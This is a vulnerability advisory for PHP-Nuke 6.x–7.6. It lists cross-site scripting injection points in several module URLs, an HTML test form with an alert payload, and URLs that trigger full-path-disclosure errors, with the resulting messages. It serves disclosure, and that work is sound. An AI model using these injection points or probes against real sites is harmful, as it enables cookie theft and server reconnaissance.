"Love converts hearts and gives peace," - John Poul II
"To milosc nawraca serca i daruje pokoj ludzkosci, ktora wydaje si&#281; czasem zagubiona i zdominowana przez sile zla, egoizmu i strachu" - Jan Pawe&#322; II [WIELKI]

Affected software :
===================
PHPNuke version : 6.x - 7.6

Description :
=============
PHP-Nuke is a Web Portal System, storytelling software, News system, online community or whatever you want to call it. The goal of PHP-Nuke is to have an automated web site to distribute news and articles with users system. Each user can submit comments to discuss the articles, just similar to Slashdot and many others. Main features include: web based admin, surveys, top page, access stats page with counter, user customizable box, themes manager for registered users, friendly administration GUI with graphic topic manager, option to edit or delete stories, option to delete comments, moderation system, Referers page to know who link us, sections manager, customizable HTML blocks, user and authors edit, an integrated Banners Ads system, search engine, backend/headlines generation (RSS/RDF format), and many, many more friendly functions. PHP-Nuke is written 100% in PHP and requires Apache Web server, PHP and a SQL (MySQL, mSQL, PostgreSQL, ODBC, ODBC_Adabas, Sybase or Interbase).

Vulnerabilities :
*****************

Cross-site scripting - XSS :
============================

In PHPNuke there are XSS that can  be used to steal cookies and do other operations, which in
normal conditions are not permitted by browser's cross-domain security restrictions. 

Example :
=========  

http://[target]/[nuke_dir]/modules.php?name=Your_Account&op=mailpasswd&username=[XSS]
http://[target]/[nuke_dir]/modules.php?name=Your_Account&op=avatarlist&avatarcategory=[XSS]
http://[target]/[nuke_dir]/modules.php?name=Downloads&d_op=outsidedownloadsetup&lid=[XSS]

To test XSS for example in http://[target]/[nuke_dir]/modules.php?name=Downloads&d_op=outsidedownloadsetup&lid=[XSS] we can
create a form. 

test.html :
-----------
<form name="mantra" method="POST" action="http://[target]/[nuke_dir]/modules.php">
<p>XSS: 
<input type="text" name="lid">
<br>
<input type="hidden" name="name" value="Downloads">
<br>
<input type="hidden" name="d_op" value="outsidedownloadsetup">
</p>
<p>
<input type="submit" name="Submit" value="Go!">
<br>
</p>
</form>
-----------------
And enter to inputfield "XSS" this :<body onload="alert('XSS')";> and click "Go!" :)

Full Path Disclosure :
======================

Full path to script must be kept in secret because it can  lead to successful attack on the
website. If the attacker know Full path to script , he can start searching some more info on others folders or about the server where the site is and  then try to break in.

Many scripts can be accessed directly and this will provoke standard
php error messages, which leads to full path disclosure. 

Examples :
----------

http://[target]/[nuke_dir]/index.php?forum_admin=1

Error message :
---------------
=====================================
Warning: main(): Unable to access ../../../config.php in /[info]/www/html/mainfile.php on line 104

Warning: main(../../../config.php): failed to open stream: No such file or directory in /[info]/www/html/mainfile.php on line 104

Fatal error: main(): Failed opening required '../../../config.php' (include_path='.:/php/includes:/usr/share/php') in /[info]/www/html/mainfile.php on line 104
======================================


More Full Path Disclosure :
---------------------------

http://[target]/[nuke_dir]/modules.php?name=Surveys&op=results&pollID=[id]&mode=&order=&thold=&tid=[something]

Error message :
---------------
=====================================
Fatal error: Cannot redeclare head() in /[info]/phpnuke/header.php on line 28
=====================================

http://[target]/[nuke_dir]/modules.php?name=Your_Account&op=avatarlist

Error message :
---------------
=====================================
Fatal error: Unknown function: nav() in /[info]/phpnuke/modules/Your_Account/index.php on line 1462
